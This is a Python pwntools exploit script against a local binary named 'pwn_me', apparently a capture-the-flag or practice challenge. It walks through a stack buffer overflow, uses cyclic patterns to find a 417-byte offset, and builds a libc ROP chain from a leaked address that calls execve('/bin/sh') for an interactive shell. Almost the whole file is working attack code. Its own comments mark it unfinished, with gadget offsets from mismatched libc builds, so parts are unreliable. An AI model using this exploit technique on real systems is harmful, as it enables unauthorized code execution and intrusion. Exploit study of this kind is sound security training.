from pwn import *

#env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc-2.27.so")}
#p = process("./pwn_me", env=env)
p = process("./pwn_me")

def A_smash():
    print(p.recv())
    input()
    '''
    gdb -p=
    b *main+560
    c
    '''
    payload = "almond "
    payload += "A"*1000
    p.sendline(payload)
    print(p.recv())

def cycle_rip():
    print(p.recv())
    input()
    '''
    gdb -p=
    b *main+560
    c
    '''
    payload = b"almond "
    payload += cyclic(1000)
    p.sendline(payload)
    print(p.recv())
    print("Input RIP from GDB")
    print(cyclic_find(input()))
    #417

def check_cycle():
    print(p.recv())
    input()
    '''
    gdb -p=
    b *main+560
    c
    '''
    payload = "almond "
    payload += "A"*417
    payload += "B"*8
    p.sendline(payload)
    print(p.recv())


def ret2csu(base_addr):
    #From https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf
    #Having to rebuild becuase this was done with a different libc
    #ROPgadget --binary libc-2.27.so > rops.txt
    #grep "pop rdi ; ret" rops.txt
    from struct import pack
    p = lambda x : pack('Q', x)
    IMAGE_BASE_0 = base_addr # libc.so.6
    #IMAGE_BASE_0 = 0x00007fda3c026000 # libc.so.6
    rebase_0 = lambda x : p(x + IMAGE_BASE_0)
    '''
    Skipping the file descriptor stuff for now
    #rop = b''
    # dup2(4,0)
    #rop = rebase_0(0x0000000000020b8b) # 0x00007fda3c046b8b: pop rdi; ret;
    rop = rebase_0(0x000000000002155f) 
    rop += p(0x0000000000000004)
    #rop += rebase_0(0x0000000000020a0b) # 0x00007fda3c046a0b: pop rsi; ret;
    rop += rebase_0(0x0000000000023e6a) 
    rop += p(0x0000000000000000)
    #rop += rebase_0(0x00000000000234c3) # 0x00007fda3c0494c3: pop rax; ret;
    rop += rebase_0(0x00000000000439c8) 
    rop += p(0x0000000000000021)
    rop += rebase_0(0x00000000000c7fd5) # 0x00007fda3c0edfd5: syscall; ret;
    rop += rebase_0(0) 
    # dup2(4,0)
    rop += rebase_0(0x0000000000020b8b) # 0x00007fda3c046b8b: pop rdi; ret;
    rop += p(0x0000000000000004)
    rop += rebase_0(0x0000000000020a0b) # 0x00007fda3c046a0b: pop rsi; ret;
    rop += p(0x0000000000000001)
    rop += rebase_0(0x00000000000234c3) # 0x00007fda3c0494c3: pop rax; ret;
    rop += p(0x0000000000000021)
    rop += rebase_0(0x00000000000c7fd5) # 0x00007fda3c0edfd5: syscall; ret;
    # dup2(4,0)
    rop += rebase_0(0x0000000000020b8b) # 0x00007fda3c046b8b: pop rdi; ret;
    rop += p(0x0000000000000004)
    rop += rebase_0(0x0000000000020a0b) # 0x00007fda3c046a0b: pop rsi; ret;
    rop += p(0x0000000000000002)
    rop += rebase_0(0x00000000000234c3) # 0x00007fda3c0494c3: pop rax; ret;
    rop += p(0x0000000000000021)
    rop += rebase_0(0x00000000000c7fd5) # 0x00007fda3c0edfd5: syscall; ret;
    '''
    # Prepare execve("/bin/sh", {"sh" , "-i", NULL}, NULL");
    # "/bin/sh\x00" ...
    #rop += rebase_0(0x0000000000123165) # 0x00007fda3c149165: pop r10; ret;
    rop = rebase_0(0x00000000001306b5) 
    rop += p(0x0068732f6e69622f)
    #rop += rebase_0(0x0000000000020b8b) # 0x00007fda3c046b8b: pop rdi; ret;
    rop += rebase_0(0x000000000002155f) 
    rop += rebase_0(0x00000000004005f0) # ?? #TODO: if these are an issue, grab an old so
    #TODO: Stopped here, having issues with finding this next gadget in the new .so
    rop += rebase_0(0x000000000005d19d) # 0x00007fda3c08319d: mov qword ptr[rdi],r10; ret;
    # "sh\x00-i\x00"
    rop += rebase_0(0x0000000000123165) # 0x00007fda3c149165: pop r10; ret;
    rop += p(0x000000692d006873)
    rop += rebase_0(0x0000000000020b8b) # 0x00007fda3c046b8b: pop rdi; ret;
    rop += rebase_0(0x00000000004005f8)
    rop += rebase_0(0x000000000005d19d) # 0x00007fda3c08319d: mov qword ptr[rdi],r10; ret;
    # {"sh",
    rop += rebase_0(0x0000000000123165) # 0x00007fda3c149165: pop r10; ret;
    rop += p(0x00000000004005f8)
    rop += rebase_0(0x0000000000020b8b) # 0x00007fda3c046b8b: pop rdi; ret;
    rop += rebase_0(0x0000000000400600)
    rop += rebase_0(0x000000000005d19d) # 0x00007fda3c08319d: mov qword ptr[rdi],r10; ret;
    # "-i",
    rop += rebase_0(0x0000000000123165) # 0x00007fda3c149165: pop r10; ret;
    rop += p(0x00000000004005fb)
    rop += rebase_0(0x0000000000020b8b) # 0x00007fda3c046b8b: pop rdi; ret;
    rop += rebase_0(0x0000000000400608)
    rop += rebase_0(0x000000000005d19d) # 0x00007fda3c08319d: mov qword ptr[rdi],r10; ret;
    # NULL}
    rop += rebase_0(0x0000000000123165) # 0x00007fda3c149165: pop r10; ret;
    rop += p(0x0000000000000000)
    rop += rebase_0(0x0000000000020b8b) # 0x00007fda3c046b8b: pop rdi; ret;
    rop += rebase_0(0x0000000000400610)
    rop += rebase_0(0x000000000005d19d) # 0x00007fda3c08319d: mov qword ptr[rdi],r10; ret;
    # execve(RDI, RSI, RDX);
    rop += rebase_0(0x0000000000020b8b) # 0x00007fda3c046b8b: pop rdi; ret;
    rop += rebase_0(0x00000000004005f0)
    rop += rebase_0(0x0000000000020a0b) # 0x00007fda3c046a0b: pop rsi; ret;
    rop += rebase_0(0x0000000000400600)
    rop += rebase_0(0x0000000000001b96) # 0x00007fda3c027b96: pop rdx; ret;
    rop += p(0x0000000000000000)
    rop += rebase_0(0x00000000000234c3) # 0x00007fda3c0494c3: pop rax; ret;
    rop += p(0x000000000000003b)
    rop += rebase_0(0x00000000000c7fd5) # 0x00007fda3c0edfd5: syscall; ret;
    #print(rop)
    return rop

def pop_shell():
    recd = p.recv()
    input()
    print(recd)
    addr_str = recd.split(b'\n')[0]
    print("Given libc addr ", addr_str)
    given_addr = int(addr_str, 16)
    base_addr = given_addr - 4111520 
    payload = b'almond '
    payload += b'A'*417
    payload += ret2csu(base_addr)
    p.sendline(payload)
    p.interactive()

if __name__=='__main__':
    #A_smash()
    #cycle_rip()
    #check_cycle()
    pop_shell()
